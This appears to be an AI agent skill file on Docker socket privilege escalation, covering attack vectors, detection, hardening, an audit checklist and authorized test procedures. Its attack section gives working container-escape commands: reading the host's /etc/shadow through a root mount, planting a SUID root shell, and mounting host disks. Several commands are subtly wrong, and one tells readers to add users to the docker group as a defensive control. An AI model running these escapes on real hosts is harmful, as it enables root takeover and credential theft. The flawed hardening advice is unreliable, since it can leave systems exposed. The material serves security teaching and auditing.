---
name: docker-socket-security
description: Security skill for understanding, detecting, and preventing Docker socket privilege escalation attacks. Use this skill whenever the user mentions Docker security, container escape, privilege escalation, Docker socket access, container security auditing, or needs to harden Docker deployments. This skill helps security professionals understand attack vectors, perform authorized penetration testing, and implement defensive measures against Docker-based privilege escalation.
---

# Docker Socket Security & Privilege Escalation

A comprehensive guide for understanding, testing, and defending against Docker socket-based privilege escalation attacks.

## When to Use This Skill

Use this skill when:
- You need to audit Docker container security configurations
- You're performing authorized penetration testing on Docker environments
- You want to understand how Docker socket access can lead to privilege escalation
- You need to harden Docker deployments against container escape attacks
- You're investigating a potential Docker security incident
- You want to learn about Docker security best practices

## Understanding the Threat Model

Docker socket access (`/var/run/docker.sock`) is essentially root access to the host system. An attacker with socket access can:
- Start privileged containers
- Mount host filesystems
- Access host devices
- Modify host configurations
- Escape container isolation

## Attack Vectors

### 1. Filesystem Mount Attacks

#### Mount Host Root
```bash
# Mount entire host filesystem into container
docker run -v /:/host -it <image> /bin/bash
# Inside container: cat /host/etc/shadow
```

#### Mount Specific Directories
```bash
# Mount writable directory and create SUID binary
docker run -v /tmp:/host -it <image> /bin/bash
# Inside container:
cp /bin/bash /host/
chmod 4755 /host/bash
# On host: /host/bash (executes as root)
```

#### Mount Device Disks
```bash
# Mount host disk device
docker run --device=/dev/sda1 --cap-add=SYS_ADMIN -it <image> /bin/bash
# Inside container:
mount /dev/sda1 /mnt
# Access host filesystem at /mnt
```

### 2. Privileged Container Escape

```bash
# Full privilege escalation
docker run --privileged -it <image> /bin/bash
# Container has full host access
```

### 3. Capability-Based Escalation

```bash
# Add specific capabilities
docker run --cap-add=SYS_ADMIN --cap-add=NET_ADMIN -it <image> /bin/bash

# Add all capabilities (dangerous)
docker run --cap-add=ALL -it <image> /bin/bash
```

### 4. Security Option Bypass

```bash
# Disable AppArmor
docker run --security-opt apparmor=unconfined -it <image> /bin/bash

# Disable Seccomp
docker run --security-opt seccomp=unconfined -it <image> /bin/bash

# Disable SELinux labels
docker run --security-opt label:disable -it <image> /bin/bash
```

### 5. Namespace Sharing

```bash
# Share host namespaces
docker run --pid=host --uts=host --userns=host --cgroupns=host -it <image> /bin/bash
# Container sees host processes, hostname, user IDs
```

## Detection & Enumeration

### Check for Docker Socket Access
```bash
# Check if socket exists and is accessible
ls -la /var/run/docker.sock

# Test socket access
docker ps

# Check mounted sockets
mount | grep docker
```

### Identify Writable Directories
```bash
# Find writable directories on host
find / -writable -type d 2>/dev/null

# Check which directories support SUID
mount | grep -v "nosuid"
```

### Enumerate Container Capabilities
```bash
# Check current container capabilities
cat /proc/self/status | grep Cap

# Check running containers
docker inspect <container_id> | grep -A 20 HostConfig
```

### Find Mount Points
```bash
# List all mounts
mount | grep -E "(host|container)"

# Check /proc/mounts
cat /proc/mounts
```

## Defensive Measures

### 1. Socket Access Control

```bash
# Restrict socket permissions
chmod 660 /var/run/docker.sock
chown root:docker /var/run/docker.sock

# Use Docker's built-in user management
usermod -aG docker <username>
```

### 2. Container Hardening

```bash
# Run containers as non-root
docker run --user 1000:1000 -it <image> /bin/bash

# Drop unnecessary capabilities
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE -it <image> /bin/bash

# Use read-only root filesystem
docker run --read-only -it <image> /bin/bash

# Disable privilege escalation
docker run --security-opt no-new-privileges -it <image> /bin/bash
```

### 3. Security Profiles

```bash
# Use AppArmor profile
docker run --security-opt apparmor=docker-default -it <image> /bin/bash

# Use Seccomp profile
docker run --security-opt seccomp=default -it <image> /bin/bash

# Use SELinux labels
docker run --security-opt label=level:s0:c100,c200 -it <image> /bin/bash
```

### 4. Namespace Isolation

```bash
# Don't share host namespaces
docker run --pid=container --uts=container -it <image> /bin/bash

# Use user namespaces
docker run --userns=non-root -it <image> /bin/bash
```

### 5. Resource Limits

```bash
# Limit container resources
docker run --memory=512m --cpus=1.0 -it <image> /bin/bash

# Limit PIDs
docker run --pids-limit=100 -it <image> /bin/bash
```

## Security Audit Checklist

### Pre-Deployment
- [ ] Docker socket permissions are restricted (660, root:docker)
- [ ] Containers run as non-root users
- [ ] Unnecessary capabilities are dropped
- [ ] Security profiles (AppArmor/Seccomp) are enabled
- [ ] Host namespaces are not shared
- [ ] Read-only root filesystem where possible
- [ ] Resource limits are configured
- [ ] No-new-privileges flag is set

### Runtime Monitoring
- [ ] Monitor for privileged container creation
- [ ] Alert on socket access from untrusted processes
- [ ] Log container escape attempts
- [ ] Monitor for unusual mount operations
- [ ] Track capability additions
- [ ] Watch for namespace sharing

### Incident Response
- [ ] Identify compromised containers
- [ ] Check for host filesystem mounts
- [ ] Review container capabilities
- [ ] Examine security option configurations
- [ ] Check for SUID binaries in mounted directories
- [ ] Audit namespace sharing

## Testing Procedures (Authorized Only)

### Test 1: Socket Access Verification
```bash
# Verify you can access the socket
docker ps

# Try to run a container
docker run --rm alpine echo "test"
```

### Test 2: Mount Attack Simulation
```bash
# Attempt to mount host filesystem
docker run -v /:/host --rm alpine ls /host/

# Check if mount succeeded
ls /host/etc/ 2>/dev/null && echo "Mount successful" || echo "Mount blocked"
```

### Test 3: Privileged Container Test
```bash
# Try to run privileged container
docker run --privileged --rm alpine id

# Check if privileged mode is allowed
```

### Test 4: Capability Test
```bash
# Test capability addition
docker run --cap-add=SYS_ADMIN --rm alpine capsh --print

# Check which capabilities are allowed
```

## Common Misconfigurations

| Misconfiguration | Risk | Fix |
|-----------------|------|-----|
| Socket world-readable | High | chmod 660 /var/run/docker.sock |
| Containers run as root | High | --user 1000:1000 |
| --privileged flag | Critical | Remove flag, use specific capabilities |
| Host namespace sharing | High | Don't use --pid=host, --uts=host |
| AppArmor disabled | Medium | --security-opt apparmor=default |
| Seccomp disabled | Medium | --security-opt seccomp=default |
| All capabilities added | Critical | Drop unnecessary capabilities |

## References

- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [Container Escape Techniques](https://github.com/RedTeamOperations/Container-Escape)
- [Docker Capabilities](https://docs.docker.com/engine/security/capabilities/)
- [AppArmor Profiles](https://www.apparmor.net/)
- [Seccomp Documentation](https://seccomp.net/)

## Important Notes

⚠️ **Authorization Required**: Only perform security testing on systems you own or have explicit written authorization to test.

⚠️ **Production Impact**: Security testing can impact production systems. Always test in isolated environments first.

⚠️ **Legal Compliance**: Ensure all testing complies with applicable laws and organizational policies.

## Quick Reference Commands

```bash
# Check Docker socket
ls -la /var/run/docker.sock

# List running containers
docker ps -a

# Inspect container security settings
docker inspect <container_id>

# Check container capabilities
cat /proc/self/status | grep Cap

# Find writable directories
find / -writable -type d 2>/dev/null

# Check mount options
mount | grep -v "nosuid"
```

## Next Steps

After using this skill, consider:
1. Running a full Docker security audit on your environment
2. Implementing the defensive measures that apply to your use case
3. Setting up monitoring for Docker security events
4. Training your team on Docker security best practices
5. Creating incident response procedures for Docker-related security events
